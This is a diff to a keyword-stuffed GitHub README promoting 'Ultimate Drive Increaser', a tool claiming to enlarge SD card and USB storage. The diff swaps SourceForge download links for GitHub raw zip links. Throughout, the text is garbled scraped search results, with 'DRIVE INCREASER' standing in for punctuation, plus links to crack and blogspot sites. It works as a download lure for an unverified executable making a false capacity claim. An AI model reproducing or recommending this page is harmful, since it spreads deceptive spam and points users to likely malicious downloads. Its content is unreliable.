@@ -1,5 +1,5 @@
 # ULTIMATE DRIVE INCREASER SOFTWARE [![N|Solid](https://camo.githubusercontent.com/4cbcafd11cbbc6351d48cb968594ad457738c49c/68747470733a2f2f612e6673646e2e636f6d2f636f6e2f6170702f73662d646f776e6c6f61642d627574746f6e)](https://github.com/DRIVE-INCREASER/ULTIMATE-DRIVE-INCREASER-SOFTWARE/raw/master/drive-increaser-master.zip)
-[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/drive%20increaser.png)](https://sourceforge.net/projects/drive-increaser/files/drive-increaser-master.zip/download)
+[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/drive%20increaser.png)](https://github.com/DRIVE-INCREASER/ULTIMATE-DRIVE-INCREASER-SOFTWARE/raw/master/ULTIMATE%20DRIVE%20INCREASER.zip)
 
 
 
@@ -17,8 +17,8 @@ https://ultimate-drive-increaser-exe.blogspot.in/2018/04/ultimate-drive-increase
 
 
 https://ultimate-drive-increaser-exe.blogspot.in/2018/04/ultimate-drive-increaser-software-free.html
-[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQzMzQ2MjMxOTY.jpg)](https://sourceforge.net/projects/drive-increaser/files/drive-increaser-master.zip/download)
-[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQyODM2MjMxNTQ.png)](https://sourceforge.net/projects/drive-increaser/files/drive-increaser-master.zip/download)
+[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQzMzQ2MjMxOTY.jpg)](https://github.com/DRIVE-INCREASER/ULTIMATE-DRIVE-INCREASER-SOFTWARE/raw/master/ULTIMATE%20DRIVE%20INCREASER.zip)
+[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQyODM2MjMxNTQ.png)](https://github.com/DRIVE-INCREASER/ULTIMATE-DRIVE-INCREASER-SOFTWARE/raw/master/ULTIMATE%20DRIVE%20INCREASER.zip)
 
 
 GitHub - DRIVE-INCREASER/ULTIMATE-DRIVE-INCREASER DRIVE INCREASERDRIVE INCREASERDRIVE INCREASER
@@ -56,8 +56,8 @@ DRIVE INCREASERs://wwwDRIVE INCREASERgitbookDRIVE INCREASERcom/book/nisurvoje/ul
 Ultimate drive increaser free download for pc Please help us improve our content by removing questions that are essentially the same and merging them into DRIVE INCREASERDRIVE INCREASERDRIVE INCREASER
 Drive Increaser Download For Pc | For Free | VdzsbisXfh · Storify
 DRIVE INCREASERs://storifyDRIVE INCREASERcom/DRIVE INCREASERDRIVE INCREASERDRIVE INCREASER/drive-increaser-download-for-pc-for-free-vdzsbisxf
-[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQzMzQ2MjMxOTY.jpg)](https://sourceforge.net/projects/drive-increaser/files/drive-increaser-master.zip/download)
-[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQyODM2MjMxNTQ.png)](https://sourceforge.net/projects/drive-increaser/files/drive-increaser-master.zip/download)
+[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQzMzQ2MjMxOTY.jpg)](https://github.com/DRIVE-INCREASER/ULTIMATE-DRIVE-INCREASER-SOFTWARE/raw/master/ULTIMATE%20DRIVE%20INCREASER.zip)
+[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQyODM2MjMxNTQ.png)](https://github.com/DRIVE-INCREASER/ULTIMATE-DRIVE-INCREASER-SOFTWARE/raw/master/ULTIMATE%20DRIVE%20INCREASER.zip)
 
 Increase Your SD Card & USB Storage With Ultimate Drive Increaser, How To Increase SD/Pen Drive Size,Free Download Bilal Kashi DRIVE INCREASERDRIVE INCREASERDRIVE INCREASER
 How To Increase SD Card Capacity Up to 32GB-Ultimate Drive Increaser
@@ -81,8 +81,8 @@ Searches related to drive increaser
 
 ultimate drive increaser !DRIVE INCREASERzip (80DRIVE INCREASER23 kb)
 
-drive increaser 32gb free download[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQzMzQ2MjMxOTY.jpg)](https://sourceforge.net/projects/drive-increaser/files/drive-increaser-master.zip/download)
-[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQyODM2MjMxNTQ.png)](https://sourceforge.net/projects/drive-increaser/files/drive-increaser-master.zip/download)
+drive increaser 32gb free download[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQzMzQ2MjMxOTY.jpg)](https://github.com/DRIVE-INCREASER/ULTIMATE-DRIVE-INCREASER-SOFTWARE/raw/master/ULTIMATE%20DRIVE%20INCREASER.zip)
+[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQyODM2MjMxNTQ.png)](https://github.com/DRIVE-INCREASER/ULTIMATE-DRIVE-INCREASER-SOFTWARE/raw/master/ULTIMATE%20DRIVE%20INCREASER.zip)
 
 
 ultimate drive increaser filehippo
@@ -97,10 +97,10 @@ free download ultimate drive increaser,increase drive size
 
 ultimate drive increaser apk
 
-[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQyMjQ5MjMwOTc.png)](https://sourceforge.net/projects/drive-increaser/files/drive-increaser-master.zip/download)
-[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQ0NTUyMjMzMTc.jpg)](https://sourceforge.net/projects/drive-increaser/files/drive-increaser-master.zip/download)
+[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQyMjQ5MjMwOTc.png)](https://github.com/DRIVE-INCREASER/ULTIMATE-DRIVE-INCREASER-SOFTWARE/raw/master/ULTIMATE%20DRIVE%20INCREASER.zip)
+[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQ0NTUyMjMzMTc.jpg)](https://github.com/DRIVE-INCREASER/ULTIMATE-DRIVE-INCREASER-SOFTWARE/raw/master/ULTIMATE%20DRIVE%20INCREASER.zip)
 
-[![N|Solid](https://d2t1xqejof9utc.cloudfront.net/screenshots/pics/3c2bfcf9dbfed0daa6fd8cae9ba41a26/large.gif)](https://sourceforge.net/projects/drive-increaser/files/drive-increaser-master.zip/download)
+[![N|Solid](https://d2t1xqejof9utc.cloudfront.net/screenshots/pics/3c2bfcf9dbfed0daa6fd8cae9ba41a26/large.gif)](https://github.com/DRIVE-INCREASER/ULTIMATE-DRIVE-INCREASER-SOFTWARE/raw/master/ULTIMATE%20DRIVE%20INCREASER.zip)
 
 About 4,73,00,000 results (0DRIVE INCREASER48 seconds) 
 Search Results
@@ -111,8 +111,8 @@ Rating: 4DRIVE INCREASER2 - ‎127 votes
 Jul 21, 2017 - We are bringing you the ultimate solution for storage problems; SData ToolDRIVE INCREASER SData Tool 64GB is a software that can increase the storage capacity of your SD Card or USBDRIVE INCREASER DRIVE INCREASERDRIVE INCREASERDRIVE INCREASER For instance, if you have a USB of 32GB; using SData Tool v1DRIVE INCREASER0DRIVE INCREASER0 you can increase it to 64GBDRIVE INCREASER
 SData Tool [Double Your USB Or SD Card Space in One Click]
 DRIVE INCREASER//wwwDRIVE INCREASERpiratecityDRIVE INCREASERnet › Softwares › Other / Special
-[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQzMzQ2MjMxOTY.jpg)](https://sourceforge.net/projects/drive-increaser/files/drive-increaser-master.zip/download)
-[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQyODM2MjMxNTQ.png)](https://sourceforge.net/projects/drive-increaser/files/drive-increaser-master.zip/download)
+[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQzMzQ2MjMxOTY.jpg)](https://github.com/DRIVE-INCREASER/ULTIMATE-DRIVE-INCREASER-SOFTWARE/raw/master/ULTIMATE%20DRIVE%20INCREASER.zip)
+[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQyODM2MjMxNTQ.png)](https://github.com/DRIVE-INCREASER/ULTIMATE-DRIVE-INCREASER-SOFTWARE/raw/master/ULTIMATE%20DRIVE%20INCREASER.zip)
 
 SData v1DRIVE INCREASER0DRIVE INCREASER0 [USB OR SD Card Space Expanding Tool] DRIVE INCREASERDRIVE INCREASERDRIVE INCREASER How to Use SData Tool v1DRIVE INCREASER0DRIVE INCREASER0 ? DRIVE INCREASERDRIVE INCREASERDRIVE INCREASER SData [USB OR SD Card Space Expanding] Tool Download Links!
 Sdata Tool 64 GB & 128 GB New 2018 [Double memory in One Click]
@@ -150,8 +150,8 @@ sdata tool app for pc windows 7 free download - SourceForge
 DRIVE INCREASER//sourceforgeDRIVE INCREASERnet/directory/?q=sdata+tool+app+for+pc+windows+7
 
 sdata tool app for pc windows 7 free downloadDRIVE INCREASER PortableAppsDRIVE INCREASERcom PortableAppsDRIVE INCREASERcom is the world's most popular portable software solution allowing you to takeDRIVE INCREASER
-Searches related to s data tool[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQzMzQ2MjMxOTY.jpg)](https://sourceforge.net/projects/drive-increaser/files/drive-increaser-master.zip/download)
-[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQyODM2MjMxNTQ.png)](https://sourceforge.net/projects/drive-increaser/files/drive-increaser-master.zip/download)
+Searches related to s data tool[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQzMzQ2MjMxOTY.jpg)](https://github.com/DRIVE-INCREASER/ULTIMATE-DRIVE-INCREASER-SOFTWARE/raw/master/ULTIMATE%20DRIVE%20INCREASER.zip)
+[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQyODM2MjMxNTQ.png)](https://github.com/DRIVE-INCREASER/ULTIMATE-DRIVE-INCREASER-SOFTWARE/raw/master/ULTIMATE%20DRIVE%20INCREASER.zip)
 
 https://ultimate-drive-increaser-exe.blogspot.in/2018/04/ultimate-drive-increaser-software-free.html
 sdata tool 32gb
@@ -186,8 +186,8 @@ Ultimate Drive Increaser - YouTube
 Video for ultimate drive increaser
 ▶ 1:51https://ultimate-drive-increaser-exe.blogspot.in/2018/04/ultimate-drive-increaser-software-free.html
 DRIVE INCREASERs://wwwDRIVE INCREASERyoutubeDRIVE INCREASERcom/watch?v=Rv_pckCa78w
-[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQzMzQ2MjMxOTY.jpg)](https://sourceforge.net/projects/drive-increaser/files/drive-increaser-master.zip/download)
-[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQyODM2MjMxNTQ.png)](https://sourceforge.net/projects/drive-increaser/files/drive-increaser-master.zip/download)
+[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQzMzQ2MjMxOTY.jpg)](https://github.com/DRIVE-INCREASER/ULTIMATE-DRIVE-INCREASER-SOFTWARE/raw/master/ULTIMATE%20DRIVE%20INCREASER.zip)
+[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQyODM2MjMxNTQ.png)](https://github.com/DRIVE-INCREASER/ULTIMATE-DRIVE-INCREASER-SOFTWARE/raw/master/ULTIMATE%20DRIVE%20INCREASER.zip)
 
 Nov 12, 2014 - Uploaded by Ultimate Creator
 How To Increase The Size Of Your Memory SD CARD From 32GB To 64GB Trick Latest 2017 !! DRIVE INCREASERDRIVE INCREASERDRIVE INCREASER HOW TO DRIVE INCREASERDRIVE INCREASERDRIVE INCREASER
@@ -205,8 +205,8 @@ Ultimate Drive Increaser fake or real? - Android Forums at DRIVE INCREASERDRIVE 
 DRIVE INCREASERs://forumsDRIVE INCREASERandroidcentralDRIVE INCREASERcom/askDRIVE INCREASERDRIVE INCREASERDRIVE INCREASER/767613-ultimate-drive-increaser-fake-realDRIVE INCREASERhtDRIVE INCREASERDRIVE INCREASERDRIVE INCREASER
 https://ultimate-drive-increaser-exe.blogspot.in/2018/04/ultimate-drive-increaser-software-free.html
 May 6, 2017 - 5 posts - ‎5 authors
-After I used that ultimate drive increaser I saw on youtube on my android phone, my sd card was expanded into 32 GB from 4 GB but when i put DRIVE INCREASERDRIVE INCREASERDRIVE INCREASER[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQzMzQ2MjMxOTY.jpg)](https://sourceforge.net/projects/drive-increaser/files/drive-increaser-master.zip/download)
-[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQyODM2MjMxNTQ.png)](https://sourceforge.net/projects/drive-increaser/files/drive-increaser-master.zip/download)
+After I used that ultimate drive increaser I saw on youtube on my android phone, my sd card was expanded into 32 GB from 4 GB but when i put DRIVE INCREASERDRIVE INCREASERDRIVE INCREASER[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQzMzQ2MjMxOTY.jpg)](https://github.com/DRIVE-INCREASER/ULTIMATE-DRIVE-INCREASER-SOFTWARE/raw/master/ULTIMATE%20DRIVE%20INCREASER.zip)
+[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQyODM2MjMxNTQ.png)](https://github.com/DRIVE-INCREASER/ULTIMATE-DRIVE-INCREASER-SOFTWARE/raw/master/ULTIMATE%20DRIVE%20INCREASER.zip)
 
 Ultimate Drive Increaser Free Download - Software Crack
 softwarecrack-freeDRIVE INCREASERblogspotDRIVE INCREASERcom/2017/04/ultimate-drive-increaser-free-downloadDRIVE INCREASERhtml
@@ -214,8 +214,8 @@ https://ultimate-drive-increaser-exe.blogspot.in/2018/04/ultimate-drive-increase
 Ultimate Drive Increaser, This Software Is Increaser Software DRIVE INCREASERDRIVE INCREASERDRIVE INCREASER The USB Drive or Micro SD Card Capacity Up To 16 GB/32 GB You can't Transfer Data Of 32GB DRIVE INCREASERDRIVE INCREASERDRIVE INCREASER
 Increase Your SD Card & USB Storage With Ultimate Drive Increaser DRIVE INCREASERDRIVE INCREASERDRIVE INCREASER
 DRIVE INCREASERs://inDRIVE INCREASERpinterestDRIVE INCREASERcom/pin/837247386948370286/
-Increase Your SD Card & USB Storage With Ultimate Drive Increaser, How To Increase SD/Pen Drive Size,Free Download Bilal Kashi Software,Bilal Kashi DRIVE INCREASERDRIVE INCREASERDRIVE INCREASER[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQzMzQ2MjMxOTY.jpg)](https://sourceforge.net/projects/drive-increaser/files/drive-increaser-master.zip/download)
-[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQyODM2MjMxNTQ.png)](https://sourceforge.net/projects/drive-increaser/files/drive-increaser-master.zip/download)
+Increase Your SD Card & USB Storage With Ultimate Drive Increaser, How To Increase SD/Pen Drive Size,Free Download Bilal Kashi Software,Bilal Kashi DRIVE INCREASERDRIVE INCREASERDRIVE INCREASER[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQzMzQ2MjMxOTY.jpg)](https://github.com/DRIVE-INCREASER/ULTIMATE-DRIVE-INCREASER-SOFTWARE/raw/master/ULTIMATE%20DRIVE%20INCREASER.zip)
+[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQyODM2MjMxNTQ.png)](https://github.com/DRIVE-INCREASER/ULTIMATE-DRIVE-INCREASER-SOFTWARE/raw/master/ULTIMATE%20DRIVE%20INCREASER.zip)
 
 Ultimate Drive Increaser Free Download For Pc WDRIVE INCREASERDRIVE INCREASERDRIVE INCREASER - ScoopDRIVE INCREASERit
 DRIVE INCREASERs://wwwDRIVE INCREASERscoopDRIVE INCREASERit/DRIVE INCREASERDRIVE INCREASERDRIVE INCREASER/ultimate-drive-increaser-free-download-for-pc-windows-8-uplDRIVE INCREASERDRIVE INCREASERDRIVE INCREASER
@@ -228,8 +228,8 @@ Dec 18, 2016 - Ultimate Drive Increaser ! click here to - download DRIVE INCREAS
 Searches related to ultimate drive increaser
 
 ultimate drive increaser !DRIVE INCREASERzip (80DRIVE INCREASER23 kb)
-[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQzMzQ2MjMxOTY.jpg)](https://sourceforge.net/projects/drive-increaser/files/drive-increaser-master.zip/download)
-[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQyODM2MjMxNTQ.png)](https://sourceforge.net/projects/drive-increaser/files/drive-increaser-master.zip/download)
+[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQzMzQ2MjMxOTY.jpg)](https://github.com/DRIVE-INCREASER/ULTIMATE-DRIVE-INCREASER-SOFTWARE/raw/master/ULTIMATE%20DRIVE%20INCREASER.zip)
+[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/addtext_com_MTQyODM2MjMxNTQ.png)](https://github.com/DRIVE-INCREASER/ULTIMATE-DRIVE-INCREASER-SOFTWARE/raw/master/ULTIMATE%20DRIVE%20INCREASER.zip)
 https://ultimate-drive-increaser-exe.blogspot.in/2018/04/ultimate-drive-increaser-software-free.html
 ultimate drive increaser for pc download filehippo
 
@@ -246,4 +246,4 @@ free download ultimate drive increaser increase drive size 100
 ultimate drive increaser filehippo
 	1	
  [![N|Solid](https://camo.githubusercontent.com/4cbcafd11cbbc6351d48cb968594ad457738c49c/68747470733a2f2f612e6673646e2e636f6d2f636f6e2f6170702f73662d646f776e6c6f61642d627574746f6e)](https://github.com/DRIVE-INCREASER/ULTIMATE-DRIVE-INCREASER-SOFTWARE/raw/master/drive-increaser-master.zip)
-[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/drive%20increaser.png)](https://sourceforge.net/projects/drive-increaser/files/drive-increaser-master.zip/download)
+[![N|Solid](https://raw.githubusercontent.com/DRIVE-INCREASER/data/master/drive%20increaser.png)](https://github.com/DRIVE-INCREASER/ULTIMATE-DRIVE-INCREASER-SOFTWARE/raw/master/ULTIMATE%20DRIVE%20INCREASER.zip)
